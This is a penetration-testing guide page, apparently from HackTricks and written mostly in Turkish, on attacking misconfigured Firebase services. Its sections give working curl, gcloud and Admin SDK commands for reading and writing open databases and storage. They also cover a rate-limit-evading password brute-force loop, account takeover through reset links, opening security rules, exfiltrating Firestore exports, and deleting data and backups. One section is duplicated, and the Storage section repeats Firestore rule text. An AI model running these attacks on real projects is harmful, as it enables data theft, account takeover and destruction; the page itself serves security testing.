# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Unauthenticated access to Firebase Realtime Database
Bir saldırganın bu saldırıyı gerçekleştirmek için özel bir Firebase iznine ihtiyacı yoktur. Gerekli olan tek şey, Firebase Realtime Database security rules içinde `.read: true` veya `.write: true` şeklinde ayarlanmış, herkese açık okuma veya yazma izni veren zayıf bir konfigürasyondur.

Saldırgan, genellikle şu formatta olan veritabanı URL'sini tespit etmelidir: `https://<project-id>.firebaseio.com/`.

Bu URL, mobile application reverse engineering (decompiling Android APKs or analyzing iOS apps), google-services.json (Android) veya GoogleService-Info.plist (iOS) gibi yapılandırma dosyalarının incelenmesi, web uygulamalarının kaynak kodunun gözden geçirilmesi veya ağ trafiğinin incelenerek `*.firebaseio.com` domain'lerine yapılan isteklerin tespit edilmesi yoluyla bulunabilir.

Saldırgan, veritabanı URL'sini tespit edip bunun herkese açık olup olmadığını kontrol eder, ardından veriye erişir ve potansiyel olarak kötü amaçlı bilgi yazabilir.

İlk olarak, veritabanının okuma erişimine izin verip vermediğini kontrol etmek için URL'ye .json ekler.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Eğer yanıt JSON verisi veya null içeriyorsa ("Permission Denied" yerine), veritabanı okuma erişimine izin veriyor demektir. Yazma erişimini kontrol etmek için saldırgan, Firebase REST API'yi kullanarak test amaçlı bir yazma isteği göndermeyi deneyebilir.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
İşlem başarılı olursa, veritabanı ayrıca yazma erişimine de izin verir.

### Cloud Firestore'da verilerin açığa çıkması
Bir saldırganın bu saldırıyı gerçekleştirmek için herhangi bir özel Firebase iznine ihtiyacı yoktur. Tek gereken, Cloud Firestore güvenlik kurallarında kuralların kimlik doğrulama olmadan veya yetersiz doğrulama ile okuma veya yazma erişimine izin verdiği bir zayıf yapılandırmanın bulunmasıdır. Tam erişim veren yanlış yapılandırılmış bir kurala örnek:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Bu kural, herkesin tüm dokümanları herhangi bir kısıtlama olmaksızın okumasına ve yazmasına izin verir. Firestore kuralları ayrıntılıdır ve koleksiyon ve doküman bazında uygulanır; bu nedenle belirli bir kuraldaki bir hata yalnızca bazı koleksiyonları açığa çıkarabilir.

Saldırgan, Firebase Project ID'yi tespit etmelidir; bu, mobil uygulama reverse engineering yoluyla, google-services.json veya GoogleService-Info.plist gibi yapılandırma dosyalarının analizi, web uygulamalarının kaynak kodunun incelenmesi veya firestore.googleapis.com isteklerini tespit etmek için ağ trafiğinin analiz edilmesi yoluyla bulunabilir.
The Firestore REST API şu formatı kullanır:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Kurallar kimlik doğrulaması olmayan okuma erişimine izin veriyorsa, saldırgan koleksiyonları ve dokümanları okuyabilir. İlk olarak belirli bir koleksiyona erişmeye çalışırlar:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Yanıt izin hatası yerine JSON belgeleri içeriyorsa, collection açığa çıkmış demektir. Saldırgan, yaygın isimleri deneyerek veya uygulamanın yapısını analiz ederek erişilebilen tüm collectionları listeleyebilir. Belirli bir belgeye erişmek için:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Eğer kurallar kimlik doğrulaması olmadan yazma erişimine izin veriyorsa veya doğrulama yetersizse, saldırgan yeni belgeler oluşturabilir:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Mevcut bir belgeyi değiştirmek için PATCH kullanılmalıdır:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Bir belgeyi silmek ve hizmet reddine (DoS) neden olmak için:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Firebase Storage'da dosyaların açığa çıkması
Bir saldırganın bu saldırıyı gerçekleştirmek için herhangi bir özel Firebase permissions'a ihtiyacı yoktur. Tek gereken, Firebase Storage security rules içinde kuralların authentication olmadan veya yetersiz doğrulama ile read veya write access izni verdiği bir hatalı yapılandırmanın bulunmasıdır. Storage rules read ve write permissions'i bağımsız olarak kontrol eder; bu nedenle bir kuraldaki hata yalnızca read access'i, yalnızca write access'i veya her ikisini birden açığa çıkarabilir. Tam erişim veren hatalı yapılandırılmış bir kural örneği şudur:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Bu kural, tüm belgeler için herhangi bir kısıtlama olmaksızın okuma ve yazma erişimine izin verir. Firestore kuralları granülerdir ve koleksiyon bazında ve belge bazında uygulanır; bu nedenle belirli bir kuraldaki bir hata yalnızca bazı koleksiyonları açığa çıkarabilir. Saldırgan, Firebase Project ID'sini tespit etmelidir; bu ID mobil uygulamanın reverse engineering'i, google-services.json veya GoogleService-Info.plist gibi yapılandırma dosyalarının analizi, web uygulaması kaynak kodunun incelenmesi veya firestore.googleapis.com'a yapılan istekleri tespit etmek için ağ trafiği analizi yoluyla bulunabilir.

Firestore REST API şu formatı kullanır:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Kurallar kimlik doğrulamasız okuma erişimine izin veriyorsa, saldırgan koleksiyonları ve belgeleri okuyabilir. İlk olarak belirli bir koleksiyona erişmeye çalışır.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Eğer yanıt izin hatası yerine dosyaların listesini içeriyorsa, dosya açığa çıkmıştır. attacker, dosyaların içeriğini yollarını belirterek görüntüleyebilir:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Kurallar kimlik doğrulama olmadan yazma erişimine izin veriyorsa veya yetersiz doğrulama varsa, saldırgan kötü amaçlı dosyalar yükleyebilir. REST API üzerinden bir dosya yüklemek için:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Saldırgan code shells, malware payloads veya büyük dosyalar yükleyerek bir denial of service oluşturabilir. Uygulama yüklenen dosyaları işler veya çalıştırırsa, saldırgan remote code execution elde edebilir. Dosyaları silmek ve bir denial of service oluşturmak için:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Genel erişime açık Firebase Cloud Functions'ın çağrılması
Bir saldırganın bu zafiyeti istismar etmek için özel bir Firebase iznine ihtiyacı yoktur; yalnızca bir Cloud Function'ın kimlik doğrulama olmadan HTTP üzerinden genel erişime açık olması yeterlidir.

Bir fonksiyon, güvensiz yapılandırıldığında savunmasızdır:

- functions.https.onRequest kullanır; bu, onCall fonksiyonlarının aksine kimlik doğrulamayı zorunlu kılmaz.
- Fonksiyonun kodu kullanıcı kimlik doğrulamasını doğrulamaz (ör. request.auth veya context.auth kontrolleri yok).
- Fonksiyon IAM içinde genel erişime açıktır; yani allUsers'a roles/cloudfunctions.invoker rolü verilmiştir. Bu, geliştirici erişimi kısıtlamadığı sürece HTTP fonksiyonları için varsayılan davranıştır.

Firebase HTTP Cloud Functions şu gibi URL'ler üzerinden erişilebilir:

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (Firebase Hosting ile entegre olduğunda)

Bir saldırgan bu URL'leri source code analysis, network traffic inspection, enumeration tools veya mobile app reverse engineering yoluyla keşfedebilir.
Fonksiyon genel olarak açığa çıkarılmış ve kimlik doğrulama gerektirmiyorsa, saldırgan kimlik bilgisi olmadan doğrudan çağırabilir.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Fonksiyon girdileri doğru şekilde doğrulanmazsa, saldırgan code injection veya command injection gibi diğer saldırılara başvurabilir.

### Brute-force attack against Firebase Authentication with a weak password policy
Bir saldırganın bu saldırıyı gerçekleştirmek için özel bir Firebase iznine ihtiyacı yoktur. Sadece Firebase API Key'in mobil veya web uygulamalarında ifşa edilmiş olması ve parola politikasının varsayılanlardan daha katı gereksinimlerle yapılandırılmamış olması gerekir.

Saldırgan, Firebase API Key'i tespit etmelidir; bu anahtar mobil uygulama reverse engineering ile, google-services.json veya GoogleService-Info.plist gibi yapılandırma dosyalarının analiz edilmesiyle, web uygulamalarının kaynak kodunun incelenmesiyle (ör. bootstrap.js içinde) veya ağ trafiğinin analiz edilmesiyle bulunabilir.

Firebase Authentication’ın REST API'si, e-posta ve parola ile kimlik doğrulamak için şu endpoint'i kullanır:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`

Eğer Email Enumeration Protection devre dışıysa, API hata yanıtları bir e-postanın sistemde var olup olmadığını (EMAIL_NOT_FOUND vs. INVALID_PASSWORD) açığa çıkarabilir; bu da saldırganların parola tahminine başlamadan önce user enumeration yapmasına olanak tanır. Bu koruma etkinleştirildiğinde, API mevcut olmayan e-postalar ve yanlış parolalar için aynı hata mesajını döndürerek user enumeration'ı engeller.

Firebase Authentication'ın rate limiting uyguladığını not etmek önemlidir; bu, kısa süre içinde çok fazla kimlik doğrulama denemesi olursa istekleri engelleyebilir. Bu nedenle, saldırganın rate-limited olmamak için denemeler arasında gecikme eklemesi gerekir.

Saldırgan API Key'i tespit eder ve bilinen hesaplara karşı birden çok parola ile kimlik doğrulama denemeleri gerçekleştirir. Eğer Email Enumeration Protection devre dışıysa, saldırgan hata yanıtlarını analiz ederek mevcut kullanıcıları enumerate edebilir:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Yanıt EMAIL_NOT_FOUND içeriyorsa, e‑posta sistemde mevcut değildir. INVALID_PASSWORD içeriyorsa, e‑posta mevcut ancak şifre yanlış; bu, kullanıcının kayıtlı olduğunu doğrular. Geçerli bir kullanıcı belirlendikten sonra saldırgan brute-force denemeleri yapabilir. Denemeler arasında duraklamalar eklemek, Firebase Authentication'ın oran sınırlama mekanizmalarından kaçınmak için önemlidir:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Varsayılan parola politikasıyla (minimum 6 karakter, karmaşıklık gereksinimi yok), saldırgan tüm olası 6 karakterlik parola kombinasyonlarını deneyebilir; bu, daha katı parola politikalarına kıyasla nispeten küçük bir arama alanı anlamına gelir.

### Firebase Authentication'da kullanıcı yönetimi

Saldırganın bu saldırıyı gerçekleştirebilmesi için belirli Firebase Authentication izinlerine ihtiyacı vardır. Gerekli izinler şunlardır:

- `firebaseauth.users.create` kullanıcı oluşturmak için
- `firebaseauth.users.update` mevcut kullanıcıları değiştirmek için
- `firebaseauth.users.delete` kullanıcıları silmek için
- `firebaseauth.users.get` kullanıcı bilgilerini almak için
- `firebaseauth.users.sendEmail` kullanıcılara e-posta göndermek için
- `firebaseauth.users.createSession` kullanıcı oturumları oluşturmak için

Bu izinler `roles/firebaseauth.admin` rolünde yer alır; bu rol Firebase Authentication kaynaklarına tam okuma/yazma erişimi verir. Ayrıca roles/firebase.developAdmin (tüm firebaseauth.* izinlerini içerir) ve roles/firebase.admin (tüm Firebase servislerine tam erişim) gibi daha üst düzey rollerde de bulunur.

Firebase Admin SDK'yı kullanmak için saldırganın servis hesabı kimlik bilgilerine (JSON dosyası) erişimi olması gerekir; bunlar ele geçirilmiş sistemlerde, kamuya açık kod depolarında, ele geçirilmiş CI/CD sistemlerinde veya bu kimlik bilgilerine erişimi olan geliştirici hesaplarının ele geçirilmesi yoluyla bulunabilir.

İlk adım, servis hesabı kimlik bilgilerini kullanarak Firebase Admin SDK'yı yapılandırmaktır.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Bir malicious user oluşturmak amacıyla victim’s email kullanılarak, attacker Firebase Admin SDK'ı kullanıp o email altında yeni bir hesap oluşturmaya çalışırdı.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Mevcut bir kullanıcıyı değiştirmek için saldırgan, e-posta adresi, doğrulama durumu veya hesabın devre dışı bırakılmış olup olmadığı gibi alanları günceller.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Bir kullanıcı hesabını silmek ve bir denial of service'e yol açmak için, saldırgan kullanıcıyı tamamen kaldırmak üzere bir istek gönderecektir.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Saldırgan ayrıca mevcut kullanıcılar hakkında UID veya email address talep ederek bilgi alabilir.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Ayrıca, saldırgan bir kullanıcının parolasını değiştirmek ve hesabına erişmek için doğrulama bağlantıları veya parola sıfırlama bağlantıları oluşturabilir.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase Authentication'da kullanıcı yönetimi
Bir saldırganın bu saldırıyı gerçekleştirebilmesi için belirli Firebase Authentication izinlerine ihtiyacı vardır. Gerekli izinler:

- `firebaseauth.users.create` kullanıcı oluşturmak için
- `firebaseauth.users.update` mevcut kullanıcıları değiştirmek için
- `firebaseauth.users.delete` kullanıcıları silmek için
- `firebaseauth.users.get` kullanıcı bilgisi almak için
- `firebaseauth.users.sendEmail` kullanıcılara e-posta göndermek için
- `firebaseauth.users.createSession` kullanıcı oturumu oluşturmak için

Bu izinler, Firebase Authentication kaynaklarına tam okuma/yazma erişimi veren roles/firebaseauth.admin rolünde yer alır. Ayrıca `roles/firebase.developAdmin` (tüm firebaseauth.* izinlerini içerir) ve `roles/firebase.admin` (tüm Firebase servislerine tam erişim) gibi daha üst düzey rollerin de parçasıdır.

Firebase Admin SDK'yı kullanmak için saldırganın hizmet hesabı kimlik bilgilerine (JSON dosyası) erişimi olması gerekir; bunlar ele geçirilmiş sistemlerden, herkese açık kod depolarından, ele geçirilmiş CI/CD ortamlarından veya bu kimlik bilgilerine erişimi olan geliştirici hesaplarının ele geçirilmesinden elde edilebilir.

İlk adım, hizmet hesabı kimlik bilgilerini kullanarak Firebase Admin SDK'yı yapılandırmaktır.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Kurbanın e-posta adresini kullanarak kötü amaçlı bir kullanıcı oluşturmak için, saldırgan o e-posta ile yeni bir kullanıcı hesabı oluşturmaya çalışır ve kendi şifresini ile profil bilgilerini atar.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Mevcut bir kullanıcıyı değiştirmek için saldırgan, e-posta adresi, doğrulama durumu veya hesabın devre dışı bırakılıp bırakılmadığı gibi alanları değiştirirdi.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Bir kullanıcı hesabını silmek — etkili olarak bir denial of service'a yol açmak — için saldırgan, o kullanıcıyı kalıcı olarak kaldırmak üzere bir istek gönderecektir.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Saldırgan, UID veya e-posta adresiyle kullanıcı detaylarını sorgulayarak mevcut kullanıcıların UID veya e-posta gibi bilgilerini de elde edebilir.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Ayrıca saldırgan doğrulama bağlantıları veya şifre sıfırlama bağlantıları oluşturabilir; bu da bir kullanıcının şifresini değiştirip hesabın kontrolünü ele geçirmesine olanak verir.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase hizmetlerindeki güvenlik kurallarının değiştirilmesi
Saldırganın güvenlik kurallarını değiştirebilmesi için, hizmete bağlı olarak belirli izinlere ihtiyacı vardır. Cloud Firestore ve Firebase Cloud Storage için gerekli izinler, ruleset oluşturmak üzere `firebaserules.rulesets.create` ve release dağıtmak üzere `firebaserules.releases.create`'dir. Bu izinler `roles/firebaserules.admin` rolünde veya `roles/firebase.developAdmin` ve `roles/firebase.admin` gibi daha üst düzey rollerde bulunur. Firebase Realtime Database için gerekli izin `firebasedatabase.instances.update`'dir.

Saldırgan güvenlik kurallarını değiştirmek için Firebase REST API'yi kullanmalıdır.
İlk olarak, saldırganın service account credentials kullanarak bir access token alması gerekir.
Token almak için:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Firebase Realtime Database kurallarını değiştirmek için:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Cloud Firestore kurallarını değiştirmek için, saldırgan bir ruleset oluşturmalı ve sonra bunu dağıtmalıdır:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Önceki komut projects/<project-id>/rulesets/<ruleset-id> formatında bir ruleset adını döndürür. Yeni sürümü dağıtmak için release, bir PATCH isteği kullanılarak güncellenmelidir:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Firebase Cloud Storage kurallarını değiştirmek için:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Önceki komut projects/<project-id>/rulesets/<ruleset-id> formatında bir ruleset adı döndürür. Yeni sürümü dağıtmak için release, bir PATCH isteğiyle güncellenmelidir:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Data exfiltration and manipulation in Cloud Firestore
Cloud Firestore, Cloud Datastore ile aynı altyapı ve izin sistemini kullanır; bu nedenle Datastore IAM izinleri doğrudan Firestore için geçerlidir. TTL politikalarını değiştirmek için `datastore.indexes.update` izni gerekir. Verileri dışa aktarmak için `datastore.databases.export` izni gereklidir. Veri içe aktarmak için datastore.databases.import izni gerekir. Toplu veri silme işlemi yapmak için `datastore.databases.bulkDelete` izni gereklidir.

Yedekleme ve geri yükleme işlemleri için belirli izinler gereklidir:

- `datastore.backups.get` ve `datastore.backups.list` mevcut yedekleri listelemek ve ayrıntılarını almak için
- `datastore.backups.delete` yedekleri silmek için
- `datastore.backups.restoreDatabase` bir yedekten veritabanını geri yüklemek için
- `datastore.backupSchedules.create` ve `datastore.backupSchedules.delete` yedekleme programlarını yönetmek için

Bir TTL politikası oluşturulduğunda, silinmeye uygun varlıkları belirlemek için atanmış bir özellik seçilir. Bu TTL özelliği Date and time türünde olmalıdır. attacker, zaten var olan bir özelliği seçebilir veya daha sonra eklemeyi planladığı bir özelliği atayabilir. Alanın değeri geçmiş bir tarihse, doküman hemen silinmeye uygun hale gelir. attacker, TTL politikalarını değiştirmek için gcloud CLI'yi kullanabilir.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Verileri dışa aktarmak ve exfiltrate etmek için saldırgan gcloud CLI'yi kullanabilir.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Kötü amaçlı veriyi içe aktarmak için:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Toplu veri silme gerçekleştirmek ve bir hizmet reddi (denial of service) oluşturmak için saldırgan, gcloud Firestore bulk-delete tool'u kullanarak tüm koleksiyonları silebilir.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Yedekleme ve geri yükleme işlemleri için saldırgan, veritabanının mevcut durumunu yakalamak üzere zamanlanmış yedekler oluşturabilir, mevcut yedekleri listeleyebilir, son değişiklikleri üzerine yazmak için bir yedekten geri yükleme yapabilir, kalıcı veri kaybına yol açmak amacıyla yedekleri silebilir ve zamanlanmış yedekleri kaldırabilir.
Hemen bir yedek oluşturan günlük bir yedekleme planı oluşturmak için:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Belirli bir yedekten geri yükleme yapmak için saldırgan, o yedekteki verileri kullanarak yeni bir veritabanı oluşturabilir. Geri yükleme işlemi yedeğin verilerini yeni bir veritabanına yazar; bu da mevcut bir DATABASE_ID kullanılamayacağı anlamına gelir.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Bir yedeği silmek ve kalıcı veri kaybına neden olmak için:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Firebase CLI kimlik bilgilerinin çalınması ve kötüye kullanımı
Bir saldırganın bu saldırıyı gerçekleştirmek için özel Firebase izinlerine ihtiyacı yoktur, ancak geliştiricinin yerel sistemine veya Firebase CLI kimlik bilgilerinin bulunduğu dosyaya erişimi olmalıdır. Bu kimlik bilgileri şu JSON dosyasında saklanır:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Bu dosya, refresh_token ve access_token dahil olmak üzere kimlik doğrulama token'larını içerir; bunlar saldırganın firebase login komutunu ilk çalıştıran kullanıcı olarak kimlik doğrulaması yapmasına olanak tanır.

Saldırgan Firebase CLI kimlik bilgileri dosyasına erişim elde eder. Ardından tüm dosyayı kendi sistemine kopyalayabilir ve Firebase CLI, varsayılan konumundan otomatik olarak bu kimlik bilgilerini kullanır. Bunu yaptıktan sonra saldırgan, o kullanıcının erişebildiği tüm Firebase projelerini görüntüleyebilir.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
